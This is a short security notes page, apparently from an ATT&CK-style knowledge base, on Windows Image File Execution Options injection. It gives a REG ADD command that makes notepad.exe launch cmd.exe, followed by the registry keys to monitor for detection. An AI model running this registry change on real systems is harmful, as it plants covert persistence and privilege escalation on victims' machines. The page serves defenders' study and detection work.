---
description: 'Defense Evasion, Persistence, Privilege Escalation'
tags: [#defense-evasion, #privilege-escalation, #persistence]
---

# Image File Execution Options Injection

## Execution

Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start cmd.exe:

```csharp
// attacker@victim
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"
```

Launching a notepad on the victim system:

![[ifeo-notepad.png]]

Same from the cmd shell:

![[ifeo-notepad2.png]]

## Observations

Monitoring command line arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>` should be helpful in detecting this attack:

![[ifeo-cmdline.png]]

![[ifeo-cmdline2.png]]

## References

[attack.mitre.org/wiki/Technique/T1183](https://attack.mitre.org/wiki/Technique/T1183)

[blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo](https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/)

[blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo](https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/)

